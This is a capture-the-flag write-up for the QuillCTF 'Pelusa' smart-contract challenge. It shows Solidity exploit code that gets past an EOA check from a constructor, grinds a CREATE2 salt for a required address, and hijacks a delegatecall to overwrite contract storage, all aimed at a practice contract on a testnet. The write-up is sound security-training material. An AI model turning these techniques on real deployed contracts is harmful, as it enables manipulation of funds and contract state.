[pelusa](https://quillctf.super.site/challenges/quillctf-challenges/pelusa)

Pelusa contract deployed by me, on FUJI testnet: 0xC1685a791fB19BaD3785b66d8ce3B68829E3a76D, at block 18573166
Account used: 0x690aD8fABE17f1EeFF88E2Ef900f7b88e6eC0aF0

NOTE!!! My deployed Pelusa contract has public owner and player, just for ease of checking that the correct variables are changing.

Solution:
* There doesn't seem to be a way to change the goals from 1 to 2, outside of the existing delegateCall, since delegatecall changes memory in the calling contract's context.
```
(bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature("handOfGod()"));
```
* For that, we need Player to become our contract and return the correct things, and isGoal to return true;

## Player to become our contract, and return the correct things: passTheBall
### require(msg.sender.code.length == 0, "Only EOA players");
---
we need passTheBall to be called from the contract's constructor
```
address internal pelusaContract = 0xC1685a791fB19BaD3785b66d8ce3B68829E3a76D;

constructor() {
	// Set up owner as well
	Pelusa(pelusaContract).passTheBall();
}
```

### require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");
---
Player's address needs to respect the above. We can precompute the address where the contract will be deployed, using create2. We can iterate through multiple salts.
```
contract Create2Factory {
	event Deploy(address addr);
	event SaltFound(uint256 salt);

	uint256 private lastSalt = 0;

	function deploy(uint256 _salt) external {
			Player _contract = new Player{
					salt: bytes32(_salt)    // the number of salt determines the address of the contract that will be deployed
			}();
			emit Deploy(address(_contract));
	}

	function computeSalt() external returns (uint256) {
		bytes memory bytecode = type(Player).creationCode;
		for (uint256 salt = lastSalt; salt < 1000000000; salt++) {
			bytes32 hash  = keccak256(
					abi.encodePacked(
							bytes1(0xff), address(this), salt, keccak256(bytecode)
					)
			);

			address resultingAddress = address(uint160(uint(hash)));

			if (uint256(uint160(resultingAddress)) % 100 == 10) {
				emit SaltFound(salt);
				lastSalt = salt + 1;
				return salt;
			}
		}
	}
}
```
We will deploy this, and first call computeSalt, which returns 192. This is the salt needed for create2, so resulting Player address will be: address % 100 == 10.

Check with openzeppelin CLI:

## isGoal to return true
---
Since owner is immutable, it is not actually in storage, but only a constant, so we need to compute it ourselves.

Owner would be, since blockhash(block.number) returns 0x0000000000000000000000000000000000000000000000000000000000000000 on contract creation.
```
owner = address(uint160(uint256(keccak256(abi.encodePacked(0x690aD8fABE17f1EeFF88E2Ef900f7b88e6eC0aF0, bytes32(0x0000000000000000000000000000000000000000000000000000000000000000))))));
```
We will return owner from handOfGod()

with msg.sender = 0x690aD8fABE17f1EeFF88E2Ef900f7b88e6eC0aF0
Found out owner: 0x4Ab40C4a78Ca4537D01E0a8c1D20E76048306BEa

## Resulting code: 
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import { Pelusa } from "./QuillCTF.sol";

contract Player {
  address internal pelusaContract = 0xC1685a791fB19BaD3785b66d8ce3B68829E3a76D;
  uint256 public goals; // this will sit at the same memory index as goals in the Pelusa contract

  address public owner;

  constructor() {
    owner = address(uint160(uint256(keccak256(abi.encodePacked(0x690aD8fABE17f1EeFF88E2Ef900f7b88e6eC0aF0, bytes32(0x0000000000000000000000000000000000000000000000000000000000000000))))));
    Pelusa(pelusaContract).passTheBall();
  }
  

  function handOfGod() external returns (uint256) {
    goals = 2;
    return uint256(22_06_1986);
  }

  function getBallPossesion() external view returns (address) {
    return owner;
  }

}
```

## Final Steps:
* Deploy Pelusa
* Take transaction hash, to figure out Pelusa's address and creation block.
* Hardcode my account and Pelusa's address in the Player contract.
* Deploy Create2Factory
* Call Create2Factory.computeSalt
* Call Create2Factory.deploy(computedSalt)
* Call Pelusa.shoot()
* Call Pelusa.goals(), to confirm there have been two goals